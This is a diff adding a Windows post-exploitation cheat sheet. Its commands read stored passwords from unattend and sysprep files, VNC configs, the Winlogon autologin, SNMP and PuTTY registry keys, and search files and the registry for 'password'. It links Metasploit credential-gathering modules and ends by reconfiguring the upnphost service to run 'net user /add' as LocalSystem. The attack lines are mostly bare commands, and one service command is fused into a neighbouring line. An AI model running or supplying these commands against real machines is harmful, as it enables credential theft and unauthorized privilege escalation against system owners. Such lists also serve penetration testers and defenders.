@@ -1,0 +1,43 @@
+    == Stored credentials == 
+
+## Search for credentials within:
+##Unattend credentials are stored in base64 and can be decoded manually with base64:
+## user@host $ base64 -d cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=
+dir c:\unattend.xml
+
+## Metasploit Framework enum_unattend module and gather credentials module:
+## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/enum_unattend.rb
+## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/credentials/gpp.rb
+
+type c:\sysprep.inf
+type c:\sysprep\sysprep.xml
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+
+findstr /S pass *.txt *.xml *.ini  // in C:\
+
+    == Windows Registry ==
+
+VNC Stored:
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+Windows Autologin:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+SNMP Parameters:
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+Putty clear text proxy credentials:
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+Search the registry - copy (pipe) to the clipboard (optional)
+reg query HKLM /f password /t REG_SZ /s [ |clip]
+reg query HKCU /f password /t REG_SZ /s [ |clip]
+
+## Change the upnp service binary
+sc qc upnphostsc config upnphost binpath= "net user /add"
+sc config upnphost obj= ".\LocalSystem" password =""
+net stop upnphost
+net start upnphost
+
